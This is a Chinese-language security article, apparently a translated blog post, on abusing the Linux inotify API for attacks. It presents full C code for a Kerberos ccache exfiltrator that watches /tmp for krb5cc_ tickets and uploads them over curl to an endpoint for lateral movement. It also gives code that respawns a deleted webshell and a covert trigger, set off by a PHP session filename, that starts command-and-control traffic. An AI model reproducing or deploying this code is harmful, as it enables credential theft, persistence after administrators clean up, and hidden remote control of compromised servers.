**我们以往在看”inotify
API”的使用的时候，关注点都放在防护端，比如在入侵事件发生后IT管理员用来监控文件或者目录的改变来辅助排查入侵事件。本文我们将重点放在攻击方，让你熟悉inotify
API的猥琐使用方式：）**

 **0x00** **窃取** **ccache** **文件**

在企业网络中，linux和windows系统共存，并将身份验证委托给AD是很常见的场景。在这种类型的环境中。当攻击者获取了一台Linux主机的权限后，通常会查看/tmp目录寻找凭证缓存文件(ccache)，该文件通常包含TGT(Ticket-Granting-Ticket)，用于通过kerberos协议进行用户到服务的认证。

该文件的命名方式如下“krb5cc_%UID%”，可以直接被基于impacket框架的工具来使用。所以如果我们能读取该文件的话，就能够使用psexec.py/smbexec.py等工具来尝试对内网其他机器进行命令执行，从而实现横向移动（如果我们足够幸运得到的这个文件来自于一个特权用户的话，甚至可以提升权限）。当我们确实知道该网络是使用kerberos作为认证的，但是现在不能够得到该文件（因为该文件寿命很短）时，我们可以设置一个Inotify
watcher来监控/tmp目录，当该文件创建时，就转发给我们。

![s1.png](https://image.3001.net/images/20190409/1554787948_5cac2e6c8dea7.png!small)

我们的计划非常简单，如上所述，新建一个watcher来监控／tmp目录，如果一个前缀是”krb5cc_”的文件被创建或者修改了，就发送给我们，代码如下：

    
    
    // Example based on <https://www.lynxbee.com/c-program-to-monitor-and-notify-changes-in-a-directory-file-using-inotify/>
    
    
    
    #define _GNU_SOURCE  
    
    
    #include <stdio.h>
    
    #include <stdlib.h>
    
    #include <errno.h>
    
    #include <sys/types.h>
    
    #include <sys/inotify.h>
    
    #include <sys/stat.h>
    
    #include <limits.h>
    
    #include <unistd.h>
    
    #include <fcntl.h>
    
    #include <curl/curl.h>
    
    #define MAX_EVENTS 1024 /*Max. number of events to process at one go*/
    
    #define LEN_NAME 1024 /*Assuming length of the filename won't exceed 16 bytes*/
    
    #define EVENT_SIZE  ( sizeof (struct inotify_event)  ) /*size of one event*/
    
    #define BUF_LEN     ( MAX_EVENTS * ( EVENT_SIZE + LEN_NAME  ) ) /*buffer to store the data of events*/
    
    #define endpoint "<http://localhost:4444>"
    
    int exfiltrate(char* filename) {
    
        CURL *curl;
    
        CURLcode res;
    
        struct stat file_info;
    
        FILE *fd;
    
        fd = fopen(filename, "rb");
    
        if(!fd){
    
            return -1;
    
        }
    
        if(fstat(fileno(fd), &file_info) != 0) {
    
            return -1;
    
        }
    
        curl = curl_easy_init();
    
        if (curl){
    
            curl_easy_setopt(curl, CURLOPT_URL, endpoint);
    
            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    
            curl_easy_setopt(curl, CURLOPT_READDATA, fd);
    
            res = curl_easy_perform(curl);
    
            if (res != CURLE_OK) {
    
                return -1;
    
            }
    
            curl_easy_cleanup(curl);
    
        }       
    
        fclose(fd);
    
        return 0;
    
    }
    
    int main(int argc, char **argv){
    
        int length, i= 0, wd;
    
        int fd; 
    
        char buffer[BUF_LEN];
    
        char *ticketloc = NULL;
    
        printf("[Kerberos ccache exfiltrator PoC]\n\n");
    
       
    
        //Initiate inotify
    
        if ((fd = inotify_init()) < 0) {
    
            printf("Could not initiate inotify!!\n");
    
            return -1;
    
        }
    
        //Add a watcher for the creation or modification of files at /tmp folder
    
        if ((wd = inotify_add_watch(fd, "/tmp", IN_CREATE | IN_MODIFY)) == -1) {
    
            printf("Could not add a watcher!!\n");
    
            return -2;
    
        }
    
        //Main loop 
    
        while(1) {
    
            i = 0;
    
            length = read(fd, buffer, BUF_LEN);
    
            if (length < 0) {
    
                return -3;
    
            }
    
            while (i < length) {
    
                struct inotify_event *event = (struct inotify_event *)&buffer[i];
    
                if (event->len) {
    
                        //Check for prefix
    
                        if (strncmp(event->name, "krb5cc_", strlen("krb5cc_")) == 0){
    
                            printf("New cache file found! (%s)", event->name);
    
                            asprintf(&ticketloc, "/tmp/%s",event->name);
    
                            //Forward it to us
    
                            if (exfiltrate(ticketloc) != 0) {
    
                                printf(" - Failed!\n");
    
                            }
    
                            else {
    
                                printf(" - Exfiltrated!\n");
    
                            }
    
                            free(ticketloc);
    
                        }
    
                    i += EVENT_SIZE + event->len;
    
                }
    
            }
    
        }
    
    }

我们可以在监控到该文件创建后，就通过LDAP搜索，来检测当前用户的权限。

##  **0x01** **重新放置** **webshell** **后门**

另一个通用的场景为，当我们放置的webshell被删除的时候（由于管理员发现，CMS更新等原因），通过使用inotify可以实现当webshell被删除的时候再创建一个，并且通知我们，代码如下

    
    
    int main(int argc, char **argv){
    
        int length, i= 0, wd;
    
        int fd; 
    
        char buffer[BUF_LEN];
    
        //Initiate inotify
    
        if ((fd = inotify_init()) < 0) {
    
            printf("Could not initiate inotify!!\n");
    
            return -1;
    
        }
    
        //Webshell location
    
    
    if ((wd = inotify_add_watch(fd, "/var/www/html/my_shinny_webshell.php", IN_DELETE | IN_DELETE_SELF) == -1) {
    
            printf("Could not add a watcher!!\n");
    
            return -2;
    
        }
    
        //Main loop 
    
        while(1) {
    
            i = 0;
    
            length = read(fd, buffer, BUF_LEN);
    
            if (length < 0) {
    
                return -3;
    
            }
    
            while (i < length) {
    
                struct inotify_event *event = (struct inotify_event *)&buffer[i];
    
                if (event->len) {
    
                    
    
          			respawn_webshell();
    
                    
    
                    i += EVENT_SIZE + event->len;
    
                }
    
            }
    
        }
    
    }

其他的想法：当一个合法的PHP文件被修改时，也同时放置我们的后门进去。或者，监控配置文件，检测数据库链接账号是否改变。

##  **0x02** **基于PHP会话名触发恶意软件行为**

我们可以通过创建一个存储PHP会话的命名文件作为隐蔽通道来和我们的Implants进行命令通信。例如下面的例子，我假想当一个命名为sess_ALEAIACTAESTXX的文件创建时，就和我们的CC进行通信。

    
    
    int main(int argc, char **argv){
    
        int length, i= 0, wd;
    
        int fd; 
    
        char buffer[BUF_LEN];
    
        //Initiate inotify
    
        if ((fd = inotify_init()) < 0) {
    
            printf("Could not initiate inotify!!\n");
    
            return -1;
    
        }
    
        //Session folder as set in session.save_path
    
        if ((wd = inotify_add_watch(fd, "/var/lib/php/session", IN_CREATE) == -1) {
    
            printf("Could not add a watcher!!\n");
    
            return -2;
    
        }
    
        //Main loop 
    
        while(1) {
    
            i = 0;
    
            length = read(fd, buffer, BUF_LEN);
    
            if (length < 0) {
    
                return -3;
    
            }
    
            while (i < length) {
    
                struct inotify_event *event = (struct inotify_event *)&buffer[i];
    
                if (event->len) {
    
                    
    
                        if (strncmp(event->name, "sess_ALEAIACTAEST", strlen("sess_ALEAIACTAEST")) == 0){
    
                            start_communication_with_CC();
    
                        }
    
                    
    
                    i += EVENT_SIZE + event->len;
    
                }
    
            }
    
        }
    
    }

通过一个简单的CURL请求（curl <http://localhost/test.php> \--cookie
"PHPSESSID=ALEAIACTAESTx1"），我们就可以触发这个动作。

 ***参考来源：[Github](https://x-c3ll.github.io/posts/rethinking-inotify/)，菲哥哥编译整理，转载请注明来自 FreeBuf.COM。 **

